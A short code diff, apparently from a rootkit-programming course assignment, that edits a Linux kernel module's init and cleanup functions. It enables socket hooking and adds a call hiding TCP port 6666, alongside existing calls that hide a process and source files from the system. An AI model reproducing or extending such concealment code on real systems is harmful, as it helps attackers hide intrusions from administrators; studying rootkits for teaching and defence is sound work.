@@ -20,12 +20,13 @@ int init_module (void)
 
 	initialize_control();
 	hook_getdents();	
-	//hook_sockets();
+	hook_sockets();
 	
 	// TODO: remove debug instructions after this
 	hide_process(3611);
 	hide_file_path("/home/martin/rootkit_programming/assignment07/main.c");
 	hide_file_path("/home/martin/rootkit_programming/assignment07/main.o");
+	hide_tcp_socket(6666);
 	return 0;
 }
 
@@ -40,7 +41,7 @@ void cleanup_module (void)
 
 	cleanup_control();
 	unhook_getdents();
-	//unhook_sockets();
+	unhook_sockets();
 	
 	/* Finally, log the unloading */
 	ROOTKIT_DEBUG("Unloading rootkit... bye!\n");
